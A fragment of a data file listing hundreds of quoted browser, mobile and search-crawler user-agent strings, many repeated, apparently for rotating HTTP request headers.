"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10",
"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
"Opera/8.5 (X11; i686 Linux; U; ru, en_US)",
"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)",
"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25",
"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant",
"C4PC UserAgent/0.7",
"Googlebot 1.01.003",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0","Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10",
"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52",
"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
"Opera/8.5 (X11; i686 Linux; U; ru, en_US)",
"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)",
"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25",
"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50",
"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant",
"C4PC UserAgent/0.7",
"Googlebot 1.01.003",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2",
"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile",
"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1",
"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3",
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25",
"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre",
